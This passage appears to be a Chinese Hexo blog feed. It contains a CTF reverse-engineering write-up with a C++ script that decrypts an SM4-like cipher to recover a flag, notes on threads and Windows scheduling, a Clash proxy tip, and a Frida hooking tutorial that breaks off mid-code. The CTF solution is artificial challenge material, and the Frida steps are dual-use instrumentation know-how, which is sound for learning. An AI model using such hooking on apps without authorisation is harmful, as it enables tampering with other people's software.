        <content type="html"><![CDATA[<p>另外那个签到就不说了</p><h2 id="easystd">easystd</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42878956/1730194715128-2d39fc92-6bba-4c3b-a2a8-de200a10cde7.png" alt="img"></p><p>这里可以看到用的是so层的函数</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42878956/1730194757654-d1eed919-fe92-471a-9372-4699fed4c6e3.png" alt="img"></p><p>分析加密</p><p>核心加密逻辑：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42878956/1730194870372-fbed92b0-ce4b-442c-9227-fac368beeec3.png" alt="img"></p><p>每4字节字节加密，通过前4个取得下一个</p><p>每轮的伪代码类似于：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="built_in">input</span>[i+<span class="number">1</span>]^<span class="built_in">input</span>[i+<span class="number">2</span>]^<span class="built_in">input</span>[i+<span class="number">3</span>]^Abox[i]</span><br><span class="line">mid = xxxx(key)</span><br><span class="line">output = mid^<span class="built_in">input</span>[i]</span><br></pre></td></tr></table></figure><p>ARM汇编看不了一点，所以只能全靠猜，最后还是在za师傅的协助下完成了，好耶！</p><p>取得最后的输出然后写脚本逆向即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;Windows.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;cstdlib&gt;</span></span><br><span class="line">UINT8 change_box[] = &#123; <span class="number">0xD1</span>, <span class="number">0x97</span>, <span class="number">0xEE</span>, <span class="number">0xF9</span>, <span class="number">0xCB</span>, <span class="number">0xE6</span>, <span class="number">0x3A</span>, <span class="number">0xB0</span>, <span class="number">0x11</span>, <span class="number">0xB1</span>, <span class="number">0x13</span>, <span class="number">0xC5</span>, <span class="number">0x2F</span>, <span class="number">0xFC</span>, <span class="number">0x2B</span>, <span class="number">0x02</span>, <span class="number">0x2C</span>, <span class="number">0x60</span>, <span class="number">0x9D</span>, <span class="number">0x71</span>, <span class="number">0x2D</span>, <span class="number">0xB9</span>, <span class="number">0x03</span>, <span class="number">0xC4</span>, <span class="number">0xAD</span>, <span class="number">0x43</span>, <span class="number">0x14</span>, <span class="number">0x21</span>, <span class="number">0x4E</span>, <span class="number">0x81</span>, <span class="number">0x01</span>, <span class="number">0x9E</span>, <span class="number">0x9B</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0xF3</span>, <span class="number">0x96</span>, <span class="number">0xE8</span>, <span class="number">0x9F</span>, <span class="number">0x7D</span>, <span class="number">0x34</span>, <span class="number">0x53</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0xEA</span>, <span class="number">0xC8</span>, <span class="number">0xAB</span>, <span class="number">0x65</span>, <span class="number">0xE3</span>, <span class="number">0xB4</span>, <span class="number">0x1B</span>, <span class="number">0xAE</span>, <span class="number">0xCE</span>, <span class="number">0x0F</span>, <span class="number">0xEF</span>, <span class="number">0x92</span>, <span class="number">0x87</span>, <span class="number">0xD8</span>, <span class="number">0x93</span>, <span class="number">0xFD</span>, <span class="number">0x72</span>, <span class="number">0x88</span>, <span class="number">0x38</span>, <span class="number">0xA1</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0xA0</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x74</span>, <span class="number">0x10</span>, <span class="number">0xBD</span>, <span class="number">0x84</span>, <span class="number">0x5E</span>, <span class="number">0x3B</span>, <span class="number">0x1E</span>, <span class="number">0xE1</span>, <span class="number">0x82</span>, <span class="number">0x48</span>, <span class="number">0xAF</span>, <span class="number">0x6F</span>, <span class="number">0x6C</span>, <span class="number">0x86</span>, <span class="number">0xB5</span>, <span class="number">0x76</span>, <span class="number">0x63</span>, <span class="number">0xDD</span>, <span class="number">0x8C</span>, <span class="number">0xFF</span>, <span class="number">0xEC</span>, <span class="number">0x08</span>, <span class="number">0x4C</span>, <span class="number">0x77</span>, <span class="number">0x51</span>, <span class="number">0x9A</span>, <span class="number">0x32</span>, <span class="number">0x19</span>, <span class="number">0x23</span>, <span class="number">0x09</span>, <span class="number">0x59</span>, <span class="number">0x64</span>, <span class="number">0x5F</span>, <span class="number">0xD6</span>, <span class="number">0xA5</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x7B</span>, <span class="number">0x3C</span>, <span class="number">0x06</span>, <span class="number">0x26</span>, <span class="number">0x7F</span>, <span class="number">0x80</span>, <span class="number">0xD3</span>, <span class="number">0x07</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x98</span>, <span class="number">0xD4</span>, <span class="number">0x20</span>, <span class="number">0x55</span>, <span class="number">0x4B</span>, <span class="number">0x31</span>, <span class="number">0x05</span>, <span class="number">0xE0</span>, <span class="number">0xA7</span>, <span class="number">0xC3</span>, <span class="number">0xCF</span>, <span class="number">0x99</span>, <span class="number">0xED</span>, <span class="number">0xB8</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x47</span>, <span class="number">0xC0</span>, <span class="number">0x3F</span>, <span class="number">0xB2</span>, <span class="number">0xA4</span>, <span class="number">0xF0</span>, <span class="number">0xF5</span>, <span class="number">0xC9</span>, <span class="number">0xFE</span>, <span class="number">0x66</span>, <span class="number">0x12</span>, <span class="number">0xA6</span>, <span class="number">0xE7</span>, <span class="number">0xA9</span>, <span class="number">0x5A</span>, <span class="number">0xA3</span>, <span class="number">0x9C</span>, <span class="number">0x33</span>, <span class="number">0x1D</span>, <span class="number">0x52</span>, <span class="number">0xAA</span>, <span class="number">0x94</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0xF2</span>, <span class="number">0x8B</span>, <span class="number">0xB6</span>, <span class="number">0xE4</span>, <span class="number">0x1A</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x29</span>, <span class="number">0x85</span>, <span class="number">0x61</span>, <span class="number">0xCD</span>, <span class="number">0x67</span>, <span class="number">0xC7</span>, <span class="number">0x2E</span>, <span class="number">0x24</span>, <span class="number">0xAC</span>, <span class="number">0x0A</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x68</span>, <span class="number">0xD2</span>, <span class="number">0xDC</span>, <span class="number">0x30</span>, <span class="number">0x42</span>, <span class="number">0xD9</span>, <span class="number">0xFA</span>, <span class="number">0x89</span>, <span class="number">0x28</span>, <span class="number">0x04</span>, <span class="number">0xF8</span>, <span class="number">0x6D</span>, <span class="number">0x75</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x5C</span>, <span class="number">0x56</span>, <span class="number">0x8A</span>, <span class="number">0x1C</span>, <span class="number">0xA8</span>, <span class="number">0x95</span>, <span class="number">0xBC</span>, <span class="number">0xDA</span>, <span class="number">0xBB</span>, <span class="number">0x78</span>, <span class="number">0x16</span>, <span class="number">0xDE</span>, <span class="number">0x5B</span>, <span class="number">0x46</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x5D</span>, <span class="number">0xDF</span>, <span class="number">0x0D</span>, <span class="number">0xC6</span>, <span class="number">0x36</span>, <span class="number">0x8F</span>, <span class="number">0xA2</span>, <span class="number">0xCA</span>, <span class="number">0x7C</span>, <span class="number">0xBA</span>, <span class="number">0x2A</span>, <span class="number">0x73</span>, <span class="number">0xD7</span>, <span class="number">0x15</span>, <span class="number">0xBF</span>, <span class="number">0xE2</span>, <span class="number">0xB3</span>, <span class="number">0xB7</span>, <span class="number">0x8E</span>, <span class="number">0x6E</span>, <span class="number">0x90</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, <span class="number">0x91</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x62</span>, <span class="number">0xBE</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0xC2</span>, <span class="number">0x69</span>, <span class="number">0xC1</span>, <span class="number">0x83</span>, <span class="number">0x1F</span>, <span class="number">0xF7</span>, <span class="number">0x7A</span>, <span class="number">0xEB</span>, <span class="number">0x3D</span>, <span class="number">0xDB</span>, <span class="number">0x4A</span>, <span class="number">0x27</span>, <span class="number">0x7E</span>, <span class="number">0xE9</span>, <span class="number">0x58</span>, <span class="number">0x39</span>, <span class="number">0xD0</span>, <span class="number">0xCC</span>, <span class="number">0x3E</span>, <span class="number">0x4F</span> &#125;;</span><br><span class="line">UINT32 xor_box[] = &#123; <span class="number">0x80A3B97F</span>, <span class="number">0xB9D4ECD6</span>, <span class="number">0x7425ECAA</span>, <span class="number">0x339BD365</span>, <span class="number">0xA5D18B13</span>, <span class="number">0x56A7A4DE</span>, <span class="number">0xE907C73E</span>, <span class="number">0xD0AA04A9</span>, <span class="number">0x6C827F28</span>, <span class="number">0xE997196A</span>, <span class="number">0x0C2F2AD8</span>, <span class="number">0xFD9D6DA5</span>, <span class="number">0x164DDA6D</span>, <span class="number">0x5FDCC2A4</span>, <span class="number">0x489987B7</span>, <span class="number">0xFDEF5978</span>, <span class="number">0x96C21ACA</span>, <span class="number">0x7FF46259</span>, <span class="number">0xB9ADC94E</span>, <span class="number">0x47FB566D</span>, <span class="number">0x8CCFC943</span>, <span class="number">0x8DA5E336</span>, <span class="number">0x1B49D41B</span>, <span class="number">0x6647A175</span>, <span class="number">0xC3DE9068</span>, <span class="number">0xF6708794</span>, <span class="number">0xE94AB191</span>, <span class="number">0x540B89A4</span>, <span class="number">0xB6ABA320</span>, <span class="number">0x2A7764D0</span>, <span class="number">0xEDC490A7</span>, <span class="number">0xC1F6DA35</span> &#125;;</span><br><span class="line">unsigned <span class="built_in">int</span> last[<span class="number">12</span>] = &#123;</span><br><span class="line"><span class="number">0x2DF2B839</span>, <span class="number">0x4CA553D7</span>, <span class="number">0x72FC8455</span>, <span class="number">0xBFEC6CFF</span>, <span class="number">0x597F4EE6</span>, <span class="number">0x9EC140C6</span>, <span class="number">0xB1E70DEA</span>, <span class="number">0xBFDC0DAB</span>,</span><br><span class="line"><span class="number">0xD05154AF</span>, <span class="number">0x25A2F8C6</span>, <span class="number">0x36A4EE33</span>, <span class="number">0xD116C3F1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned <span class="built_in">int</span> lastb[<span class="number">12</span>] = &#123; <span class="number">0x39B8F22D</span>,<span class="number">0xD753A54C</span>,<span class="number">0x5584FC72</span>,<span class="number">0xFF6CECBF</span>,<span class="number">0xE64E7F59</span>,<span class="number">0xC640C19E</span>,<span class="number">0xEA0DE7B1</span>,<span class="number">0xAB0DDCBF</span>,<span class="number">0xAF5451D0</span>,<span class="number">0xC6F8A225</span>,<span class="number">0x33EEA436</span>,<span class="number">0xF1C316D1</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define PAIR64(high, low) (((uint64_t)(high) &lt;&lt; 32) | (uint32_t)(low))</span></span><br><span class="line">UINT64 get(<span class="built_in">int</span> index) &#123;</span><br><span class="line"><span class="keyword">return</span> change_box[index &amp; <span class="number">0xff</span>] ^ <span class="number">7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void enc(UINT32* <span class="built_in">input</span>) &#123;</span><br><span class="line">UINT32 changer, p2, p4, p3, p1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">p1 = <span class="built_in">input</span>[i];</span><br><span class="line">p2 = <span class="built_in">input</span>[i + <span class="number">1</span>];</span><br><span class="line">p3 = <span class="built_in">input</span>[i + <span class="number">2</span>];</span><br><span class="line">p4 = <span class="built_in">input</span>[i + <span class="number">3</span>];</span><br><span class="line">UINT32 m = p2 ^ p3 ^ p4 ^ xor_box[i];</span><br><span class="line">UINT32* pm = &amp;m;</span><br><span class="line">UINT8* p = (UINT8*)pm;</span><br><span class="line">UINT32 need1 = get(p[<span class="number">3</span>]);</span><br><span class="line">UINT32 need2 = (need1 &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">UINT32 cul_num1 = (get(p[<span class="number">3</span>]) &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) | (get(p[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) | get(p[<span class="number">0</span>]);</span><br><span class="line">UINT64 cul_num2 = ((get(p[<span class="number">0</span>]) &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">3</span>]) &lt;&lt; <span class="number">16</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) | get(p[<span class="number">1</span>])) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">UINT32 final_enc = cul_num1 ^ (cul_num2 &gt;&gt; <span class="number">8</span>) ^ p1 ^ ((need1 &gt;&gt; <span class="number">6</span>) | cul_num1 &lt;&lt; <span class="number">2</span>) ^ (PAIR64(cul_num1, need2) &gt;&gt; <span class="number">22</span>) ^ (PAIR64(cul_num1, cul_num2) &gt;&gt; <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line">//std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; final_enc &lt;&lt; <span class="string">&quot; ,&quot;</span>;</span><br><span class="line"><span class="built_in">input</span>[i + <span class="number">4</span>] = final_enc;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void dec(UINT* <span class="built_in">input</span>) &#123;</span><br><span class="line">UINT32 changer, p2, p4, p3, p1;</span><br><span class="line">UINT32 out[<span class="number">5</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">35</span>; i &gt; <span class="number">3</span>; i--) &#123;</span><br><span class="line">p1 = <span class="built_in">input</span>[i - <span class="number">3</span>];</span><br><span class="line">p2 = <span class="built_in">input</span>[i - <span class="number">2</span>];</span><br><span class="line">p3 = <span class="built_in">input</span>[i - <span class="number">1</span>];</span><br><span class="line">p4 = <span class="built_in">input</span>[i];</span><br><span class="line"></span><br><span class="line">UINT32 m = p1 ^ p2 ^ p3 ^ xor_box[i - <span class="number">4</span>];</span><br><span class="line">UINT32* pm = &amp;m;</span><br><span class="line">UINT8* p = (UINT8*)pm;</span><br><span class="line">UINT32 need1 = get(p[<span class="number">3</span>]);</span><br><span class="line">UINT32 need2 = (need1 &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">UINT32 cul_num1 = (get(p[<span class="number">3</span>]) &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) | (get(p[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) | get(p[<span class="number">0</span>]);</span><br><span class="line">UINT64 cul_num2 = ((get(p[<span class="number">0</span>]) &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">3</span>]) &lt;&lt; <span class="number">16</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) | get(p[<span class="number">1</span>])) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">UINT32 final_dec = cul_num1 ^ (cul_num2 &gt;&gt; <span class="number">8</span>) ^ p4 ^ ((need1 &gt;&gt; <span class="number">6</span>) | cul_num1 &lt;&lt; <span class="number">2</span>) ^ (PAIR64(cul_num1, need2) &gt;&gt; <span class="number">22</span>) ^ (PAIR64(cul_num1, cul_num2) &gt;&gt; <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i &lt; <span class="number">8</span>) &#123;</span><br><span class="line">out[i - <span class="number">4</span>] = final_dec;</span><br><span class="line"><span class="built_in">input</span>[i - <span class="number">4</span>] = final_dec;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">input</span>[i - <span class="number">4</span>] = final_dec;</span><br><span class="line">&#125;</span><br><span class="line">//std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; final_dec &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//std::cout &lt;&lt; std::endl;</span><br><span class="line">//std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; out[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; out[<span class="number">1</span>] &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; out[<span class="number">2</span>] &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; out[<span class="number">3</span>];</span><br><span class="line">std::cout &lt;&lt; (char*)out &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void) &#123;</span><br><span class="line">//UINT32 input_num[<span class="number">36</span>] = &#123; <span class="number">0x31323334</span>, <span class="number">0x31323334</span>, <span class="number">0x35363738</span>, <span class="number">0x35363738</span> &#125;;</span><br><span class="line">//UINT32 encn[<span class="number">36</span>] = &#123;&#125;;</span><br><span class="line">//<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">//&#123;</span><br><span class="line">//encn[i] = input_num[i];</span><br><span class="line">//&#125;</span><br><span class="line">//enc(encn);</span><br><span class="line">//UINT32 lll[<span class="number">32</span>] = &#123; <span class="number">0xee53ae6d</span> ,<span class="number">0xad8d58d3</span> ,<span class="number">0xe904c44a</span> ,<span class="number">0xffa30914</span> ,<span class="number">0xa34d50fe</span> ,<span class="number">0x6d0b76d8</span> ,<span class="number">0x93d7b44c</span> ,<span class="number">0x9f34dba</span> ,<span class="number">0x43f64ea2</span> ,<span class="number">0xd2961d0a</span> ,<span class="number">0xabc12a71</span> ,<span class="number">0x5506c498</span> ,<span class="number">0xe60804c1</span> ,<span class="number">0x6fab9817</span> ,<span class="number">0xa680fb2e</span> ,<span class="number">0xc903775d</span> ,<span class="number">0xacae3b34</span> ,<span class="number">0x564cb9a3</span> ,<span class="number">0x93db754a</span> ,<span class="number">0x66321125</span> ,<span class="number">0xbc6fcb43</span> ,<span class="number">0x5a069224</span> ,<span class="number">0x3661a351</span> ,<span class="number">0xa06815fb</span> ,<span class="number">0xa7096626</span> ,<span class="number">0xc78b501</span> ,<span class="number">0xf9d14107</span> ,<span class="number">0x1ecbf7c7</span> ,<span class="number">0xd23229c8</span> ,<span class="number">0xf04e9414</span> ,<span class="number">0x4eee3557</span> ,<span class="number">0xd01d30b3</span> &#125;;</span><br><span class="line">//<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">//&#123;</span><br><span class="line">//encn[i] = <span class="number">0</span>;</span><br><span class="line">//&#125;</span><br><span class="line">//dec(encn);</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">UINT32 tround[<span class="number">36</span>] = &#123;&#125;;</span><br><span class="line">tround[<span class="number">32</span>] = lastb[i + <span class="number">3</span>];</span><br><span class="line">tround[<span class="number">33</span>] = lastb[i + <span class="number">2</span>];</span><br><span class="line">tround[<span class="number">34</span>] = lastb[i + <span class="number">1</span>];</span><br><span class="line">tround[<span class="number">35</span>] = lastb[i];</span><br><span class="line">dec(tround);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意最后输出顺序是倒序输出，当时被这个坑了</p><hr><p>最后看完其它人的wp发现这个就是个SM4，我白学了QAQ</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> so </tag>
            
            <tag> SM4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多线程基本知识</title>
      <link href="/posts/db8fb698.html"/>
      <url>/posts/db8fb698.html</url>
      
        <content type="html"><![CDATA[<h2 id="程序，进程，线程">程序，进程，线程</h2><p>程序是有自己内存布局的一种模块。内存布局一部分由已经实现好的确定的数据和动态执行时的区域两部分。</p><p><img src="https://s2.loli.net/2024/10/28/qPehVxkaOfTtvNj.png" alt="image-20241028143850519"></p><p>程序是进程的组件。进程需要通过组件来完成对应的功能。如果这个程序不依赖其它程序即可完成其既定的功能，它的内存布局也就是进程的内存布局。如若不是，那么上图中的布局（代码区和静态数据区）会有多份。</p><p>进程就是计算机正在执行的任务。它有自己的指令流和内存空间以及一颗虚拟CPU。</p><p>默认情况下一个进程只有一个控制流，但是在现代操作系统结构中，进程可以有多个控制流。每个控制流有一个单独的调用栈。这就是线程。线程隶属于一个进程，可以访问这个进程中绝大部分资源。Windows下，所有任务运行的单位就是线程。</p><h2 id="几个模型">几个模型</h2><h3 id="多进程模型">多进程模型</h3><p>时分伪并行：对于进程来说，把CPU时间切片，在对应的时间执行对应的进程，由于时间很短，就会有并行的效果。每个进程还有一个独立空间和映射的虚拟CPU，每次切换时都会通过某些硬件机制或软件机制切换控制权，同时保存好切换的进程的环境信息。因此对于进程而言，它们是连续执行的。</p><h3 id="线程模型">线程模型</h3><p>分为用户级线程和内核级线程</p><p>用户级线程为应用程序在某些控制点上分离虚拟控制流以模拟多个控制流行为。线程切换效率（较内核级线程）高，可以自定义切换算法，但控制力弱</p><p>内核级线程指操作系统提供线程能力，可以直接控制线程的工作。系统维护一张全局线程表，记录线程的各种信息。在一些情况下（如：sleep，wait，select等函数或硬中断和异常）执行对应的线程调度。从而应用进程不需要考虑切换进程，也不需要担心自己会占用过多CPU时间，因为操作系统会协调</p><h2 id="并发编程">并发编程</h2><p>三种构造并发程序的方式：</p><ul><li>基于进程：内核实现的多进程通信</li><li>基于IO多路复用：逻辑流被抽象化为状态机，主动监测文件描述符</li><li>基于线程：内核调度，共享虚拟地址</li></ul><p>IO多路复用：<a href="https://www.cnblogs.com/yrxing/p/14143644.html">一文搞懂I/O多路复用及其技术 - 尹瑞星 - 博客园</a></p><p>另外2个：《深入理解计算机系统》</p><h2 id="线程调度">线程调度</h2><p>如果一个进程有多个线程，那么如何判断什么时候该执行哪个线程呢。Windows中线程调度依赖于<code>异常</code>的触发。(写这篇的时候还没学中断和异常，具体内容先留着)，异常拥有等级，高等级的异常可以打断低等级的异常的处理，等级被称为IRQL，对于IRQL等于1的线程，表示正在插入异步过程调用（APC）对象，若IRQL等于2，表示正在执行线程调度(选择新线程，处理硬件中断中不紧急的部分)，被称为延迟过程调用（DPC）。通过这两种异常，可以对线程进行调度。</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 开发 </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clash-bug修复</title>
      <link href="/posts/6e34e55a.html"/>
      <url>/posts/6e34e55a.html</url>
      
        <content type="html"><![CDATA[<p>最近也开始使用clash了，但是每次都是用的系统代理，导致一些网站总是出奇怪的bug。<br>然后开始想可不可以像burpsuit一样从浏览器监听端口，然后成功了。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">localhost</span>:<span class="number">7890</span></span><br></pre></td></tr></table></figure><p>浏览器设置好后即可防止全局代理直接在浏览器使用clash代理</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> clash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frida-基本使用方法</title>
      <link href="/posts/d2ac55a9.html"/>
      <url>/posts/d2ac55a9.html</url>
      
        <content type="html"><![CDATA[<h1>Frida</h1><p><a href="https://www.cnblogs.com/Only-xiaoxiao/p/17294561.html">Frida 原理及简单使用 - Only-xiaoxiao - 博客园 (cnblogs.com)</a></p><p>找的一篇佬的博客</p><h2 id="Android">Android</h2><h3 id="基本环境创建">基本环境创建</h3><p>对于安卓模拟器：</p><p>首先需要手机端有frida server，如果是模拟器需要x86和x64的版本，如果是真机，需要arm86和arm64。然后本机需要frida。</p><h3 id="模拟器">模拟器</h3><h4 id="建立连接">建立连接</h4><p>在电脑端使用adb shell连接至手机端，在shell中启动frida_server，启动参数为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server-x -l 0.0.0.0:xxxx</span><br></pre></td></tr></table></figure><p>启动server时，-l指定ip和端口号，，用于创建和电脑端的连接</p><p>电脑端使用adb</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:xxxx tcp:xxxx</span><br></pre></td></tr></table></figure><p>和手机端建立通信完成，现在frida-server正在等待电脑的frida连接</p><h4 id="附加进程">附加进程</h4><p>不过frida附加的是进程，所以先使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -H 127.0.0.1:xxxx</span><br></pre></td></tr></table></figure><p>-H表示frida指定使用端口号连接目标，用ps来查看目标的进程名，</p><p>得到进程名yyy后，使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -H 127.0.0.1:xxxx yyy -l hook.js</span><br></pre></td></tr></table></figure><p>使用同样的方法附加目标的yyy进程，并直接附加脚本hook.js，这里的脚本需要指定全部路径</p><p>连接上之后应该会出现frida提示信息和字符画</p><p>之后出现的命令行可以写入任意frida-js指令</p><h3 id="真机">真机</h3><p>建立连接，由于手机是通过usb连接的，所以先在手机端启动server。<br>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>U指usb调试</p><p>取得进程名。</p><p>然后使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U apk_name -l hook.js</span><br></pre></td></tr></table></figure><p>使用hook.js附加到apk_name进程</p><h3 id="使用脚本">使用脚本</h3><p>native层的Hook：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> 